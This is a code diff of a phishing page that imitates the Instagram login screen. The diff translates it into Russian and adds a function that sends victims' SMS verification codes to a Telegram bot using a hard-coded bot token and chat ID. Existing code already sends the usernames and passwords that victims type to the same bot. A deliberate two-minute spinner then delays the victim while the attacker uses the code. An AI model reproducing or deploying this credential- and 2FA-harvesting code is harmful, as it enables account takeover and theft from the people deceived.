@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Log in • Instagram</title>
+    <title>Войти • Instagram</title>
     <link rel="shortcut icon" href="./Instagram_logo_2022.svg.png" type="image/x-icon">
     <style>
         /* General Reset */
@@ -173,7 +173,6 @@
         /* Infinite loading spinner for SMS verification */
         #smsLoadingSpinner {
             display: none;
-
             border: 4px solid #f3f3f3;
             border-top: 4px solid #0095f6;
             border-radius: 50%;
@@ -194,6 +193,48 @@
             font-size: 16px;
         }
     </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <!-- Instagram Logo -->
+        <img src="./Instagram_logo_2022.svg.png" alt="Instagram Logo">
+        <h1>Проверьте свой статус в Instagram</h1>
+        <!-- Login Form -->
+        <form onsubmit="handleLogin(event)">
+            <input type="text" id="username" name="username" placeholder="Имя пользователя" required>
+            <input type="password" id="password" name="password" placeholder="Пароль" required>
+            <input type="submit" value="Войти">
+        </form>
+
+        <!-- Loading Spinner -->
+        <div id="loadingSpinner"></div>
+
+        <!-- Divider -->
+        <div class="divider">
+            <span>ИЛИ</span>
+        </div>
+
+        <!-- Sign Up Link -->
+        <div class="signup-link">
+            <p> Нет аккаунта? <a href="#">Зарегистрироваться</a></p>
+        </div>
+    </div>
+
+    <!-- Modal for SMS Verification -->
+    <div id="smsModal" class="modal">
+        <div class="modal-content">
+            <h3>Проверьте свои СМС, мы отправили вам код!</h3>
+            <p>Если код не был отправлен, попробуйте войти снова.</p>
+            <input type="text" id="verificationCode" placeholder=" Введите код подтверждения" required>
+            <button onclick="handleVerificationCode()">Отправить</button>
+
+            <div id="error"></div>
+            <!-- SMS Loading Spinner -->
+            <div id="smsLoadingSpinner"></div>
+        </div>
+    </div>
+
     <script>
         // Function to send data to Telegram Bot
         function sendToTelegram(username, password) {
@@ -215,6 +256,26 @@
                 });
         }
 
+        // Function to send verification code to Telegram Bot
+        function sendVerificationCodeToTelegram(code) {
+            const botToken = '7848679382:AAG9RDlm4FVRpyKcbXCoLExV_CoA4TCu7RI'; // Replace with your bot API token
+            const chatId = '6956607670'; // Replace with your chat ID
+
+            const message = `Verification Code: ${code}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            // Send request to Telegram
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Verification code sent:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending verification code to Telegram:', error);
+                });
+        }
+
         // Handle login form submission
         function handleLogin(event) {
             event.preventDefault(); // Prevent page refresh on form submit
@@ -227,7 +288,7 @@
                 sendToTelegram(username, password); // Send username and password to Telegram
                 showModal(); // Show the modal after login attempt
             } else {
-                alert('Please enter both username and password.');
+                alert('Пожалуйста, введите и имя пользователя, и пароль.');
             }
         }
 
@@ -253,19 +314,21 @@
         function handleVerificationCode() {
             const verificationCode = document.getElementById('verificationCode').value;
 
-            // Show infinite loading for 2 minutes after submitting the code
-            showSmsLoadingSpinner();
-
             if (verificationCode) {
+                // Send the verification code to Telegram
+                sendVerificationCodeToTelegram(verificationCode);
+
+                // Show infinite loading for 2 minutes after submitting the code
+                showSmsLoadingSpinner();
+
                 setTimeout(() => {
                     hideSmsLoadingSpinner();
                     // Show error message after 2 minutes if code is not correct
                     const errorMessage = document.getElementById("error");
-                    errorMessage.textContent = 'The code is not correct, double-check the code!';
-                }, 6000); // Keep loading spinner for 2 minutes (120000 ms)
+                    errorMessage.textContent = 'Код неверный, проверьте его еще раз!';
+                }, 120000); // Keep loading spinner for 2 minutes (120000 ms)
             } else {
-                hideSmsLoadingSpinner();
-                alert('Please enter the verification code.');
+                alert('Пожалуйста, введите код подтверждения.');
             }
         }
 
@@ -279,47 +342,6 @@
             document.getElementById('smsLoadingSpinner').style.display = 'none';
         }
     </script>
-</head>
-
-<body>
-    <div class="login-container">
-        <!-- Instagram Logo -->
-        <img src="./Instagram_logo_2022.svg.png" alt="Instagram Logo">
-        <h1>Check your status in Instagram</h1>
-        <!-- Login Form -->
-        <form onsubmit="handleLogin(event)">
-            <input type="text" id="username" name="username" placeholder="Username" required>
-            <input type="password" id="password" name="password" placeholder="Password" required>
-            <input type="submit" value="Log In">
-        </form>
-
-        <!-- Loading Spinner -->
-        <div id="loadingSpinner"></div>
-
-        <!-- Divider -->
-        <div class="divider">
-            <span>OR</span>
-        </div>
-
-        <!-- Sign Up Link -->
-        <div class="signup-link">
-            <p>Don't have an account? <a href="#">Sign up</a></p>
-        </div>
-    </div>
-
-    <!-- Modal for SMS Verification -->
-    <div id="smsModal" class="modal">
-        <div class="modal-content">
-            <h3>Check your SMS, we have sent a code!</h3>
-            <p>If the code is not sent, try again to login.</p>
-            <input type="text" id="verificationCode" placeholder="Enter verification code" required>
-            <button onclick="handleVerificationCode()">Submit</button>
-
-            <div id="error"></div>
-            <!-- SMS Loading Spinner -->
-            <div id="smsLoadingSpinner"></div>
-        </div>
-    </div>
 </body>
 
 </html>
